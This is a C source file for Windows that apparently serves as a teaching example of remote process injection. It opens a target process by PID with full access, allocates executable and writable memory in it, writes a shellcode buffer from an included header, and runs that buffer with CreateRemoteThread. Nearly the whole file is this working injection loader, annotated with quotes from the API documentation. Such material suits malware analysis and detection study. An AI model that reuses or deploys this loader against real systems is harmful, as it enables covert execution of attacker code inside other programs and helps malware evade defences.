#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {

    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    #include "../shellcode.h"

    int pid = atoi(argv[1]);
    printf("Target PID: %d\n", pid);

    // Open a handle to the target process
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    HANDLE OpenProcess(
        [in] DWORD dwDesiredAccess,
        [in] BOOL  bInheritHandle,
        [in] DWORD dwProcessId
    );
    */
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,  // Request all access rights to the target process
        FALSE,               // Do not inherit the handle
        pid                  // Target process ID
    );

    // Check if the handle to the target process was opened successfully
    if (hProcess == INVALID_HANDLE_VALUE || hProcess == NULL) {
        printf("Failed to open process with PID %d. Error: %lu\n", pid, GetLastError());
        return -1;
    }
    printf("Successfully opened handle to process with PID %d: %p\n", pid, hProcess);

    // Allocate memory for the shellcode
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    LPVOID VirtualAllocEx(
        [in]           HANDLE hProcess,
        [in, optional] LPVOID lpAddress,
        [in]           SIZE_T dwSize,
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect
    );
    */
    LPVOID HandleMemory = VirtualAllocEx(
        hProcess,                   // Handle to the target process
        NULL,                       // No specific address because we don't mind where it is allocated 
        sizeof(shellcode),          // Size of the allocation we need (size of our shellcode)
        MEM_COMMIT | MEM_RESERVE,   // Allocate reserved and committed memory
        PAGE_EXECUTE_READWRITE      // Memory protection - we need to be able write the shellcode and execute it in this memory
    );
    
    // Check if the memory allocation was successful
    if (HandleMemory == NULL) {
        return -1;
    }
    printf("Memory allocated successfully at address: %p\n", HandleMemory);

    // Write the shellcode to the allocated memory
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
    );
    */
    SIZE_T bytesWritten = 0;
    BOOL RESULT = WriteProcessMemory(
        hProcess,                   // Handle to the target process 
        HandleMemory,               // Pointer to the base address in the target process where data will be written (our allocated memory)
        &shellcode,                 // Pointer to the buffer that contains the data to be written (our shellcode)
        sizeof(shellcode),          // Size of the data to be written (size of our shellcode)
        &bytesWritten               // Receives the number of bytes written
    );

    // Check if the WriteProcessMemory call was successful
    if (RESULT == 0 || bytesWritten != sizeof(shellcode)) {
        return -1;
    }
    printf("Wrote %zu bytes to allocated memory.\n", bytesWritten);

    // Create a new thread to execute the shellcode
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    HANDLE CreateRemoteThread(
        [in]  HANDLE                 hProcess,
        [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
        [in]  SIZE_T                 dwStackSize,
        [in]  LPTHREAD_START_ROUTINE lpStartAddress,
        [in]  LPVOID                 lpParameter,
        [in]  DWORD                  dwCreationFlags,
        [out] LPDWORD                lpThreadId
  );
    */
    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(
        hProcess,                               // Handle to the target process
        NULL,                                   // Default security attributes
        0,                                      // Default stack size
        (LPTHREAD_START_ROUTINE)HandleMemory,   // Pointer to the shellcode in allocated memory
        NULL,                                   // No arguments to the thread function
        0,                                      // Default creation flags
        &threadId                               // Receives the thread identifier
    );

    // Check if the thread was created successfully
    if (hThread == NULL) {
        return -1;
    }
    printf("Thread created successfully with ID: %lu\n", threadId);

    // Wait for the created thread to finish execution
    WaitForSingleObject(
        hThread,                      // Handle to the thread
        INFINITE                      // Wait indefinitely until the thread terminates
    );

    // Clean up: Close handles and free the allocated remote memory
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, HandleMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}